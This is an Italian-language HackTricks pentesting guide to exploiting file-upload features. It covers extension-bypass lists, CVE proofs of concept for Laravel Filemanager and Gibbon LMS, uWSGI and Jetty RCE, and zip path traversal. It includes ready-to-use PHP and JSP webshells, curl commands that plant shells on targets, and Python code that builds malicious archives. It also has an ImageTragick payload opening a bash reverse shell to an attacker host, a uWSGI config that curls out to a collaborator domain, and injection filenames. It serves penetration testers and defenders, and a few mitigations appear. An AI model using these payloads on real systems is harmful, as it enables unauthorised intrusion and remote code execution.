# Caricamento file

{{#include ../../banners/hacktricks-training.md}}

## Metodologia generale per il caricamento dei file

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, .php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass dei controlli sulle estensioni dei file

1. Se applicabile, controlla le estensioni precedenti. Testale anche usando qualche lettera MAIUSCOLA: _pHp, .pHP5, .PhAr ..._
2. Verifica **l'aggiunta di un'estensione valida prima** dell'estensione eseguibile (usa anche le estensioni precedenti):
- _file.png.php_
- _file.png.Php5_
3. Prova ad aggiungere **caratteri speciali alla fine.** Puoi usare Burp per **bruteforce** tutti i caratteri **ascii** e **Unicode**. (_Nota che puoi anche provare ad usare le estensioni **precedentemente** menzionate_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Prova a bypassare le protezioni **ingannando il parser delle estensioni** lato server con tecniche come il **raddoppio** dell'**estensione** o l'**inserimento di junk** (**null** bytes) tra le estensioni. _Puoi anche usare le **estensioni precedenti** per preparare un payload migliore._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Aggiungi **un altro livello di estensioni** ai controlli precedenti:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Prova a mettere l'**estensione eseguibile prima** dell'estensione valida e spera che il server sia mal configurato. (utile per sfruttare misconfigurazioni di Apache dove qualsiasi cosa con estensione **.php**, ma **non necessariamente terminante in .php**, eseguirà codice):
- _ex: file.php.png_
7. Usare gli **NTFS alternate data stream (ADS)** su **Windows**. In questo caso, verrà inserito un carattere due punti ":" dopo un'estensione proibita e prima di una permessa. Di conseguenza, sul server verrà creato un **file vuoto con l'estensione proibita** (es. "file.asax:.jpg"). Questo file potrebbe essere modificato successivamente con altre tecniche come l'uso del short filename. Il pattern "**::$data**” può anche essere usato per creare file non vuoti. Pertanto, aggiungere un punto dopo questo pattern potrebbe essere utile per bypassare ulteriori restrizioni (es. "file.asp::$data.")
8. Prova a rompere i limiti del nome file. L'estensione valida viene tagliata. E il PHP malevolo rimane. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Alcuni upload handler troncano o normalizzano i caratteri di punto finale dal nome file salvato. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) nelle versioni precedenti alla 2.9.1, è possibile bypassare la validazione delle estensioni:

- Usare un MIME valido per immagini e l'header magic corrispondente (per esempio, il PNG: `\x89PNG\r\n\x1a\n`).
- Nominare il file caricato con un'estensione PHP seguita da un punto, es.: `shell.php.`.
- Il server rimuove il punto finale e persiste `shell.php`, che verrà eseguito se posizionato in una directory servita dal web (storage pubblico di default come `/storage/files/`).

PoC minimo (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Quindi richiedi il percorso salvato (tipico in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks impostando il **value** dell'**header** **Content-Type** a: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check aggiungendo all'inizio del file i **bytes of a real image** (confondere il comando _file_). Oppure inserire la shell nei **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oppure puoi anche **inserire il payload direttamente** in un'immagine:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se alla tua immagine viene applicata una **compression**, per esempio usando librerie PHP standard come [PHP-GD](https://www.php.net/manual/fr/book.image.php), le tecniche precedenti non saranno utili. Tuttavia, puoi usare il chunk **PLTE** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- La pagina web potrebbe anche ridimensionare l'**image**, usando ad esempio le funzioni PHP-GD `imagecopyresized` o `imagecopyresampled`. Tuttavia, puoi usare il chunk **IDAT** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Un'altra tecnica per creare un payload che **survives an image resizing**, usando la funzione PHP-GD `thumbnailImage`. In alternativa, puoi usare il chunk **tEXt** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Trova una vulnerabilità per **rename** il file già caricato (per cambiare l'estensione).
- Trova una vulnerabilità di **Local File Inclusion** per eseguire il backdoor.
- **Possible Information disclosure**:
1. Carica **più volte** (e al **medesimo tempo**) lo **stesso file** con lo **stesso nome**
2. Carica un file con il **nome** di un **file** o **cartella** che **esiste già**
3. Caricando un file con nome `"." , "..", or "…"` come nome. Per esempio, in Apache in **Windows**, se l'applicazione salva i file caricati nella directory "/www/uploads/", il filename "." creerà un file chiamato
uploads” nella directory "/www/".
4. Carica un file che potrebbe non essere eliminato facilmente come **"…:.jpg"** in **NTFS**. (Windows)
5. Carica un file in **Windows** con **caratteri non validi** come `|<>*?”` nel suo nome. (Windows)
6. Carica un file in **Windows** usando **nomi riservati** (**forbidden**) come CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Prova anche a **caricare un executable** (.exe) o un **.html** (meno sospetto) che **eseguirà codice** quando viene aperto accidentalmente dalla vittima.

### Special extension tricks

Se stai cercando di caricare file su un server **PHP**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se stai cercando di caricare file su un server **ASP**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

I file `.phar` sono come i `.jar` per java, ma per php, e possono essere **usati come un php file** (eseguendoli con php, o includendoli dentro uno script...)

L'estensione `.inc` è talvolta usata per file php che vengono usati solo per **importare file**, quindi, a un certo punto, qualcuno potrebbe aver permesso che **questa estensione venisse eseguita**.

## **Jetty RCE**

Se puoi caricare un file XML in un server Jetty puoi ottenere [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Quindi, come mostrato nell'immagine seguente, carica il file XML in `$JETTY_BASE/webapps/` e aspettati la shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Per un'esplorazione dettagliata di questa vulnerabilità consulta la ricerca originale: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Le vulnerabilità di Remote Command Execution (RCE) possono essere sfruttate su server uWSGI se si ha la capacità di modificare il file di configurazione `.ini`. I file di configurazione di uWSGI sfruttano una sintassi specifica per incorporare variabili "magic", placeholder e operatori. In particolare, l'operatore '@', utilizzato come `@(filename)`, è progettato per includere il contenuto di un file. Tra i vari scheme supportati in uWSGI, lo scheme "exec" è particolarmente potente, permettendo la lettura di dati dallo standard output di un processo. Questa funzionalità può essere manipolata per scopi dannosi come Remote Command Execution o Arbitrary File Write/Read quando viene processato un file di configurazione `.ini`.

Considera il seguente esempio di un dannoso `uwsgi.ini` file, che mostra vari scheme:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'esecuzione del payload avviene durante il parsing del file di configurazione. Perché la configurazione sia attivata e parsata, il processo uWSGI deve essere riavviato (eventualmente dopo un crash o a causa di un Denial of Service) oppure il file deve essere impostato su auto-reload. La funzione auto-reload, se abilitata, ricarica il file a intervalli specificati quando viene rilevata una modifica.

È fondamentale comprendere la natura permissiva del parsing dei file di configurazione di uWSGI. Nello specifico, il payload discusso può essere inserito in un file binario (ad esempio un'immagine o un PDF), ampliando ulteriormente la superficie di possibile sfruttamento.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (il server ignora type/name, decodifica in base64 la parte finale)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

PoC minimale per scrivere e leggere un file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Carica una webshell minimale ed esegui comandi:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Note:
- Il handler esegue `base64_decode($_POST["img"])` dopo aver suddiviso per `;` e `,`, poi scrive i byte in `$absolutePath . '/' . $_POST['path']` senza validare estensione/tipo.
- Il codice risultante viene eseguito come l'utente del servizio web (es. XAMPP Apache su Windows).

I riferimenti per questo bug includono l'advisory usd HeroLab e la voce NVD. Vedi la sezione References qui sotto.

## **wget File Upload/SSRF Trick**

In alcune occasioni potresti trovare che un server sta usando **`wget`** per **download files** e puoi **indicare** l'**URL**. In questi casi, il codice può controllare che l'estensione dei file scaricati sia inclusa in una whitelist per assicurare che vengano scaricati solo file consentiti. Tuttavia, **questo controllo può essere bypassato.**\
La **maximum** length of a **filename** in **linux** è **255**, tuttavia **wget** tronca i nomi dei file a **236** caratteri. Puoi **download a file called "A"*232+".php"+".gif"**, questo filename bypasserà il **check** (come in questo esempio **".gif"** è una estensione **valid**) ma `wget` rinominerà il file in **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

### Escaping upload directory via NTFS junctions (Windows)

(Per questo attacco avrai bisogno di accesso locale alla macchina Windows) Quando gli upload sono memorizzati sotto sottocartelle per utente su Windows (es., C:\Windows\Tasks\Uploads\<id>\) e controlli la creazione/cancellazione di quella sottocartella, puoi sostituirla con una directory junction che punti a una posizione sensibile (es., il webroot). Gli upload successivi verranno scritti nel percorso di destinazione, consentendo l'esecuzione di codice se il target interpreta codice lato server.

Esempio di flusso per reindirizzare gli upload nella XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Note
- mklink /J crea una junction di directory NTFS (reparse point). L'account del web server deve seguire la junction e avere permessi di scrittura nella destinazione.
- Questo reindirizza scritture arbitrarie di file; se la destinazione esegue script (PHP/ASP), ciò diventa RCE.
- Contromisure: non permettere che le root di upload scrivibili siano controllabili dall'attaccante sotto C:\Windows\Tasks o simili; bloccare la creazione di junction; validare le estensioni lato server; memorizzare gli upload su un volume separato o con ACL con deny‑execute.

### Upload del body compresso GZIP + path traversal nel parametro destination → JSP webshell RCE (Tomcat)

Alcuni upload/ingest handler scrivono il body raw della richiesta in un percorso del filesystem costruito da query parameters controllati dall'utente. Se l'handler supporta anche Content-Encoding: gzip e non canonicalizza/valida il percorso di destinazione, puoi combinare directory traversal con un payload gzippato per scrivere byte arbitrari in una directory servita dal web e ottenere RCE (es., depositare una JSP sotto webapps di Tomcat).

Flusso generico di sfruttamento:
- Prepara il tuo payload server-side (es., minimal JSP webshell) e comprimi i byte con gzip.
- Invia un POST dove un parametro di path (es., token) contiene traversal che esce dalla cartella prevista, e file indica il nome del file da salvare. Imposta Content-Type: application/octet-stream e Content-Encoding: gzip; il body è il payload compresso.
- Naviga verso il file scritto per innescare l'esecuzione.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Poi innesca:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Note
- Target paths vary by install (e.g., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). Any web-exposed folder that executes JSP will work.
- Burp Suite’s Hackvertor extension può produrre un corretto corpo gzip dal tuo payload.
- Questo è un pattern puro di pre-auth arbitrary file write → RCE; non si basa su multipart parsing.

Mitigazioni
- Determina le destinazioni di upload lato server; non fidarti mai dei frammenti di percorso forniti dai client.
- Canonicalizza e assicurati che il percorso risolto rimanga all'interno di una directory base allow-listed.
- Conserva gli upload su un volume non eseguibile e nega l'esecuzione di script da percorsi scrivibili.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) è uno strumento potente progettato per assistere Pentesters e Bug Hunters nel test dei meccanismi di file upload. Sfrutta varie tecniche di bug bounty per semplificare il processo di identificazione e sfruttamento delle vulnerabilità, garantendo valutazioni approfondite delle applicazioni web.

### Corrupting upload indices with snprintf quirks (historical)

Alcuni handler di upload legacy che usano `snprintf()` o simili per costruire array multi-file da un singolo upload possono essere ingannati nel forgiare la struttura `_FILES`. A causa di incoerenze e troncamenti nel comportamento di `snprintf()`, un singolo upload accuratamente creato può apparire come più file indicizzati lato server, confondendo la logica che assume una forma fissa (es., trattarlo come un multi-file upload e prendere branche insicure). Sebbene oggi sia di nicchia, questo pattern di “index corruption” occasionalmente riemerge in CTF e codebase più vecchi.

## From File upload to other vulnerabilities

- Imposta **filename** su `../../../tmp/lol.png` e prova ad ottenere un **path traversal**
- Imposta **filename** su `sleep(10)-- -.jpg` e potresti riuscire a ottenere una **SQL injection**
- Imposta **filename** su `<svg onload=alert(document.domain)>` per ottenere una XSS
- Imposta **filename** su `; sleep 10;` per testare del command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Prova diversi payload SVG da [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Se puoi indicare al web server di recuperare un'immagine da una URL, potresti provare ad abusare di un [SSRF](../ssrf-server-side-request-forgery/index.html). Se questa **image** verrà **saved** in un sito **public**, potresti anche indicare un URL da [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDF appositamente creati per XSS: la [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Se puoi uploadare PDF potresti preparare un PDF che eseguirà JS arbitrario seguendo le indicazioni fornite.
- Carica il contenuto di \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) per verificare se il server ha un **antivirus**
- Verifica se esiste un **size limit** nell'upload dei file

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Consulta [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) per altri tipi di file.

## Zip/Tar File Automatically decompressed Upload

Se puoi caricare uno ZIP che verrà decompresso sul server, puoi fare 2 cose:

### Symlink

Carica un archivio contenente symlink a altri file; accedendo ai file decompressi accederai ai file linkati:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decomprimere in cartelle diverse

La creazione inattesa di file in directory durante la decompressione è un problema significativo. Nonostante l'ipotesi iniziale che questa configurazione potesse proteggere da OS-level command execution tramite malicious file uploads, il supporto alla compressione gerarchica e le capacità di directory traversal del formato di archivio ZIP possono essere sfruttate. Questo permette agli attackers di bypassare le restrizioni ed evadere le secure upload directories manipolando la decompression functionality dell'applicazione target.

Un exploit automatizzato per creare tali file è disponibile su [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). L'utilità può essere usata come mostrato:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Inoltre, la **symlink trick with evilarc** è un'opzione. Se l'obiettivo è mirare a un file come `/flag.txt`, bisogna creare un symlink a quel file nel tuo sistema. Questo garantisce che evilarc non incontri errori durante la sua esecuzione.

Di seguito è riportato un esempio di codice Python usato per creare un file zip malevolo:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusare della compressione per file spraying**

Per maggiori dettagli **consulta il post originale su**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Il codice PHP è scritto per eseguire comandi passati tramite la variabile `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Vengono creati più file e viene assemblato un archivio zip contenente questi file.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: I nomi dei file all'interno dello zip vengono alterati usando vi o un hex editor, cambiando "xxA" in "../" per attraversare le directory.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Quando un backend valida le voci di ZIP usando PHP’s ZipArchive ma l'estrazione scrive nel filesystem usando i nomi raw, è possibile infiltrare un'estensione non permessa inserendo un NUL (0x00) nei campi del nome file. ZipArchive tratta il nome della voce come una C‑string e lo tronca al primo NUL; il filesystem scrive il nome completo, scartando tutto ciò che segue il NUL.

High-level flow:
- Preparare un file contenitore legittimo (es. un PDF valido) che incorpora un piccolo PHP stub in uno stream, così il magic/MIME rimane PDF.
- Nominarlo tipo `shell.php..pdf`, zipparlo, quindi modificare esadecimalmente l'header locale dello ZIP e il nome nel central directory per sostituire il primo `.` dopo `.php` con `0x00`, ottenendo `shell.php\x00.pdf`.
- I validator che si basano su ZipArchive "vedranno" `shell.php .pdf` e lo permetteranno; l'estrattore scrive `shell.php` su disco, portando a RCE se la cartella di upload è eseguibile.

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Note
- Cambiare ENTRAMBE le occorrenze del filename (local e central directory). Alcuni strumenti aggiungono anche un extra data descriptor – regolare tutti i campi name se presenti.
- Il file payload deve comunque superare il server‑side magic/MIME sniffing. Incapsulare il PHP in uno stream PDF mantiene l'header valido.
- Funziona quando il percorso di enum/validation e il percorso di extraction/write divergono nel trattamento delle stringhe.

### Stacked/concatenated ZIPs (parser disagreement)

Concatenare due file ZIP validi produce un blob in cui parser diversi si focalizzano su diversi record EOCD. Molti strumenti individuano l'ultimo End Of Central Directory (EOCD), mentre alcune librerie (es. ZipArchive in workflow specifici) possono analizzare il primo archivio che trovano. Se la validation enumera il primo archivio e l'extraction usa un altro tool che rispetta l'ultimo EOCD, un archivio benigno può superare i controlli mentre uno malicious viene estratto.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Schema di abuso
- Crea un archivio benigno (tipo consentito, es. un PDF) e un secondo archivio contenente un'estensione bloccata (es. `shell.php`).
- Concatenali: `cat benign.zip evil.zip > combined.zip`.
- Se il server valida con un parser (vede benign.zip) ma estrae con un altro (processa evil.zip), il file bloccato finisce nel percorso di estrazione.

## ImageTragic

Carica questo contenuto con un'estensione immagine per sfruttare la vulnerabilità **(ImageMagick , 7.0.1-1)** (dal [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporare PHP Shell in PNG

Incorporare una PHP shell nel chunk IDAT di un file PNG può efficacemente bypassare alcune operazioni di image processing. Le funzioni `imagecopyresized` e `imagecopyresampled` di PHP-GD sono particolarmente rilevanti in questo contesto, essendo comunemente usate rispettivamente per il ridimensionamento e il resampling delle immagini. La capacità della PHP shell incorporata di rimanere non influenzata da queste operazioni è un vantaggio significativo per alcuni casi d'uso.

